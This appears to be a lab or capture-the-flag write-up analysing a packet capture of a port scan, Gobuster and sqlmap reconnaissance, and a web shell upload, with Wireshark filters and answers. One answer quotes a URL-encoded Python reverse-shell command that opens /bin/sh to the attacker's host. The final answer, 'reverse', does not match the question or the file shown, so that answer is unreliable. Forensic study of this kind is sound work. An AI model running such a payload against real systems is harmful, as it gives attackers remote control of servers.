#### Questions

##### 1) What is the IP responsible for conducting the port scan activity?

We can see this question's answer 

```
Statistics-> Conversations
```

**Answer:** 10.251.96.4

##### 2) What is the port range scanned by the suspicious host? 

```
Statistics-> Conversations -> port
```

**Answer:** 1-1024

##### 3) What is the type of port scan conducted?

```
Filter =>  src.ip==10.251.96.4 
Immediately we see a load of SYN packets sent to each port for 10.251.96.5. This tells us that a TCP SYN scan was conducted.
```

**Answer:** TCP SYN

##### 4) Two more tools were used to perform reconnaissance against open ports, what were they?

```
Filter => ip.dst == 10.251.96.5 && http.user_agent
_ View in User-Agent: 
```

**Answer:** Gobuster 3.0.1, sqlmap 1.4.7

##### 5) What is the name of the php file through which the attacker uploaded a web shell? 

```

The third command is clearly some python script. Follow the TCP Stream to view it fully.

GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
```

**Answer:** reverse
